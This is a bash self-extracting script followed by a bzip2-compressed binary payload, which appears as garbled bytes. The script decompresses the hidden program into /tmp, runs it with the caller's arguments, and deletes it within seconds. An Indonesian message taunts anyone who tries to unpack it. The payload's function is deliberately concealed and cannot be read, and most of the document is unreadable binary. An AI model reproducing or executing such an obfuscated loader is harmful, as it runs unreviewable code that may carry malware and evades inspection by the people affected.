#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�� 	_�sp���?�߾����`    P��DJ���u���D�F�@
y&�5=ODz�`�SM6��2i����ȓ&�h�jm!�4hdf�24ѐ  d�"M&��4§Ꞛ��4�<��ޔ�Ě4�@D��A�@4�4�d�4�LF� �M)�Q�S 4hh� � Ɉ���� �d�H���ZREl�O��:N��5&�."����oe�Y�pAs��(2�H�Lo�A"�*/c�+�S�n�E0GF������h9�ur6>����O{c�c�3��F1��_#"�7. �J���,uE�N��t2��ذV�tI�u�n�[���a��+D�v"��Eh�y�|Ebf���f���p��Y�v/��r���r2�4Š�$>��ij�8����`wN��)�y����R�����'����/�~Z�1�i�t���@�'�I�AQ�|�٧_#�+{n;����o��@,�
�s1pN<��ݤ�ض����EQ�i6�IC�K|�J�5 D�v���,1��[�M���۽!D416�B�����������az��jC��>��xϒ�������;�m͍��ϛ���{p��f�f��Uk�I4nU>b���3����y���z��e�k������n���������1�珌]PE^봚� �q�և�`/~��G�:*�*�N%��[�6F#rArř�P���[�p[M��v{�y�����:CI�bMPz&dϡ���yTҚ3t�UQ�Qy�˓6�=fD���F)1r�9J���p���[�:�e�j�^�"<�է�1IС$d�q� o�$�I�WW3Q�Y&�#\�+s�ڿ�o��t/�y�d�$�l��pBP����u0�SV�%���[���C	�f��䜤Z�i�i|��h��c�L�YlR��!C�ZGyh�B�]���0�&�P�^���j�EDDnEiH��=m_��Z'ŋ�|5���M�E�f#RtDG�1g� ڶԕyΠ֜Ih�$�t�T1�D��y�T��86�|;���3��*@�Xĉg�x����G�㩓n����u�L�ݕ C�K�e	�b"n^ -[��ބ��a�\��8�TPT:���).+).�9h��I��^=�K~r�p ������k����3l�����ȩEn��m0�̙)P�<�NS&�c����Դ-�La{6P���h�a�Q@P� � �
��Y��o��Pe"���F�DE �S�5�"t��?Wg�FLĞhE �a��A�<M����I�BM		x����E 5�$	��]��BC�d�